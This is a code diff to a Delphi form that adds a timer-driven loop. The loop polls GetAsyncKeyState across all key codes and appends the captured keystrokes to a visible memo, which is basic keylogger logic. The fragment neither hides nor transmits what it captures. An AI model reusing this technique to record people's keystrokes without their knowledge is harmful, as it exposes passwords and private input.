@@ -16,7 +16,10 @@ type
   TForm1 = class(TForm)
     Button1: TButton;
     Memo1: TMemo;
+    Timer1: TTimer;
+    Memo2: TMemo;
     procedure Button1Click(Sender: TObject);
+    procedure Timer1Timer(Sender: TObject);
   private
     { Private-Deklarationen }
   public
@@ -36,10 +39,15 @@ form1.Memo1.Lines.add(txt);
 end;
 
 procedure TForm1.Button1Click(Sender: TObject);
+begin
+Memo1.text := '';
+Memo2.Text := '';
+end;
+
+procedure TForm1.Timer1Timer(Sender: TObject);
 var
 ikey, KeyResult : Integer;
 begin
-memo1.Text := '';
 ikey := 0;
 Repeat
   keyresult := GetAsyncKeyState(ikey);
@@ -93,6 +101,8 @@ Repeat
 222: DisplayAction(' ~ ');
 226: DisplayAction(' \ ');
 else
+if (ikey >=32) and (Ikey <=110) then
+  begin
 if (ikey >= 65) and (ikey <= 90) then
 Memo1.Text := Memo1.Text + Chr(ikey);
 if (ikey >= 32) and (ikey <= 63) then
@@ -100,10 +110,13 @@ Memo1.Text := Memo1.Text + Chr(ikey);
 //numpad keycodes
 if (ikey >= 96) and (ikey <= 110) then
 Memo1.Text := Memo1.Text + Chr(ikey);
+  end
+else
+memo1.Lines.add(IntToStr(ikey));
 end;
 end; //case;
 inc(ikey);
 until ikey = 255;
-
 end;
+
 end.
